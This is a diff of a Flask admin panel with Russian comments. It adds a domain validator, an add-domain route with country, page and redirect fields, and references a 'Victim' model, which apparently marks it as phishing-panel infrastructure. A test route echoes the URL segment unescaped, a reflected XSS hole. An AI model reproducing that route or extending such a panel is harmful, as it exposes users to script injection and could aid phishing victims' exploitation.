@@ -5,17 +5,47 @@ from hashlib import sha256
 from db import User, Victim
 import requests
 import json
+import re
 from datetime import datetime
 from config import salt
 
 
 db = User('./users.db', 'users')
 
+
+
+
+
+def is_valid_domain(domain):
+    domain_pattern = r"^(?!:\/\/)(?!https:\/\/)([A-Za-z0-9.-]+(\.[A-Za-z]{2,})+)$"
+    if bool(re.match(domain_pattern, domain)):
+        length = domain.split('.')
+        if len(length) > 2:
+            return False
+        else:
+            return True
+    return False
+
+
+
+
+
+
+
+
+
+
+
+
+
 @app.route('/')
 def index():
     return redirect(url_for('panel'))
-
-
+###########################################
+#                                         #
+#                  Вход                   #
+#                                         #
+###########################################
 @app.route('/login', methods=['POST', 'GET'])
 def login():
     if request.method == 'POST':
@@ -63,7 +93,11 @@ def login():
             return render_template('login.html')
 
 
-
+###########################################
+#                                         #
+#                  Панель                 #
+#                                         #
+###########################################
 @app.route('/panel', methods=['POST', 'GET'])
 def panel():
     global db
@@ -94,7 +128,11 @@ def panel():
     return render_template('index.html', username=username, admin=admin, logs=logs)
 
 
-
+###########################################
+#                                         #
+#          Добавить пользователя          #
+#                                         #
+###########################################
 @app.route('/add_user', methods=['POST'])
 def add_user():
     if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
@@ -114,7 +152,11 @@ def add_user():
         return jsonify({'status': 'error', 'message': 'Нет доступа'})
     
 
-
+###########################################
+#                                         #
+#          Удалить пользователя           #
+#                                         #
+###########################################
 @app.route('/remove_user', methods=['POST'])
 def remove_user():
     if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
@@ -133,7 +175,11 @@ def remove_user():
         return jsonify({'status': 'error', 'message': 'Нет доступа'})
 
 
-
+###########################################
+#                                         #
+#         Изменить пользователя           #
+#                                         #
+###########################################
 @app.route('/edit_user', methods=['POST'])
 def edit_user():
     if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
@@ -175,8 +221,12 @@ def edit_user():
 
 
 
-
-@app.route('/domains', methods=['POST', 'GET'])
+###########################################
+#                                         #
+#                  Домены                 #
+#                                         #
+###########################################
+@app.route('/domains', methods=['GET'])
 def domains():
     if 'username' in session:
         username = session['username']
@@ -190,18 +240,50 @@ def domains():
 
 
 
+###########################################
+#                                         #
+#              Добавить домен             #
+#                                         #
+###########################################
+@app.route('/add_domain', methods=['POST'])
+def add_domain():
+    if 'username' in session:
+        username = session['username']
+        countries = json.loads(request.form.get('countries'))
+        domain = request.form.get('domain')
+        page = request.form.get('page')
+        path = request.form.get('path')
+        redirect = request.form.get('redirect')
+
+        if not countries or not domain or not page or not redirect:
+            return jsonify({'status': 'error', 'message': 'Неверно заполнена форма'})
+        else:
+            if is_valid_domain(domain):
+
+                
+
+
+                return jsonify({'status': 'success', 'message': 'Успешно добавлен домен'})
+            else:
+                return jsonify({'status': 'error', 'message': 'Неверный домен, домен должен быть первого уровня и без протоколов'})
+    else:
+        return jsonify({'status': 'error', 'message': 'Нет доступа'})
 
 
 
 
+@app.route('/<name>', methods=['GET'])
+def test(name):
+    return name
 
 
 
 
-
-
-
-
+###########################################
+#                                         #
+#                  Выход                  #
+#                                         #
+###########################################
 @app.route('/logout')
 def logout():
     if 'username' in session and session['username'] != db.GetAdmins(session['username'])[0]:
